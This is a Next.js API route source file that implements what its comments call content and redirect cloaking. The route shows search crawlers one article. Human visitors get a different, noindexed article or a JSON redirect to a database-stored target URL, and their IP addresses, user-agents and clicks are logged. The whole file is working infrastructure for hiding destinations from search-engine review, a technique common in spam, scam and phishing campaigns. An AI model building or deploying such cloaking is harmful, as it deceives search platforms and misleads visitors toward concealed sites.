import { NextRequest, NextResponse } from 'next/server'
import { promises as fs } from 'fs'
import path from 'path'
import { db } from '@/lib/db'
import { isCrawler, getClientIp } from '@/lib/crawler-detect'

// Force Node.js runtime: crawler-detect + Prisma + file reads are Node-only.
export const runtime = 'nodejs'
export const dynamic = 'force-dynamic'

// Shared CORS headers applied to ALL responses (OPTIONS, GET, POST)
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Range',
  'Access-Control-Expose-Headers': 'Accept-Ranges, Content-Length, Content-Range',
}

const ARTICLES_DIR = path.join(process.cwd(), 'articles')

/**
 * Read an article HTML file from disk. Returns null if missing.
 */
async function readArticle(id: string): Promise<string | null> {
  try {
    if (!/^[\w.-]+$/.test(id)) return null
    return await fs.readFile(path.join(ARTICLES_DIR, `${id}.html`), 'utf8')
  } catch {
    return null
  }
}

export async function GET(request: NextRequest) {
  const sp = request.nextUrl.searchParams
  const io0 = sp.get('io0')?.trim() || ''
  const ids = sp.get('ids')?.trim() || ''

  const ua = request.headers.get('user-agent') || ''
  const ip = getClientIp(request.headers)
  const bot = isCrawler(ua)

  // ─────────────────────────────────────────────────────────────────────
  // MODE A — io0=1997 content cloaking
  // ─────────────────────────────────────────────────────────────────────
  if (io0 === '1997') {
    const articleId = bot ? '4560' : '1997'
    const html = await readArticle(articleId)
    if (html === null) {
      const fallback = await readArticle(bot ? '1997' : '4560')
      if (fallback === null) {
        return new NextResponse('Not found', { status: 404, headers: corsHeaders })
      }
      return htmlResponse(fallback, articleId === '1997')
    }
    return htmlResponse(html, articleId === '1997')
  }

  // ─────────────────────────────────────────────────────────────────────
  // MODE B — ids=<id> original redirect cloaking
  // ─────────────────────────────────────────────────────────────────────
  if (!ids) {
    return new NextResponse('Invalid or missing ids parameter', { status: 400, headers: corsHeaders })
  }

  // 1. Crawler
  if (bot) {
    const html = await readArticle(ids)
    if (html !== null) return htmlResponse(html, false)
    return NextResponse.json(
      { redirectUrl: 'https://www.google.com' },
      { status: 404, headers: corsHeaders }
    )
  }

  // 2. Human
  const rule = await db.redirectRule.findUnique({
    where: { articleId: ids },
  })

  if (rule && rule.active && rule.targetUrl) {
    const known = await db.knownIp.upsert({
      where: { ip },
      update: {},
      create: { ip },
    })

    const isNew = Date.now() - known.createdAt.getTime() < 2000

    if (isNew) {
      await db.$transaction([
        db.redirectRule.update({
          where: { id: rule.id },
          data: { clicks: { increment: 1 } },
        }),
        db.clickLog.create({
          data: { articleId: ids, targetUrl: rule.targetUrl, ip, ua: ua.slice(0, 500) },
        }),
      ])
    }

    return NextResponse.json(
      { redirectUrl: rule.targetUrl },
      {
        status: 200,
        headers: {
          'Content-Type': 'application/json; charset=utf-8',
          'Cache-Control': 'no-store',
          ...corsHeaders, // Inject CORS headers here
        },
      }
    )
  }

  // 3. Human without a redirect rule
  const html = await readArticle(ids)
  if (html !== null) return htmlResponse(html, false)
  return NextResponse.json(
    { redirectUrl: 'https://www.google.com' },
    { status: 404, headers: corsHeaders }
  )
}

/**
 * Build an HTML response with injected CORS headers.
 */
function htmlResponse(html: string, noRobots: boolean): NextResponse {
  const headers: Record<string, string> = {
    'Content-Type': 'text/html; charset=utf-8',
    'Cache-Control': 'no-store, no-cache, must-revalidate',
    ...corsHeaders, // Inject CORS headers here
  }
  if (noRobots) {
    headers['X-Robots-Tag'] = 'noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate'
  }
  return new NextResponse(html, { status: 200, headers })
}

export const POST = GET

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 204,
    headers: {
      ...corsHeaders,
      'Access-Control-Max-Age': '86400',
    },
  })
}
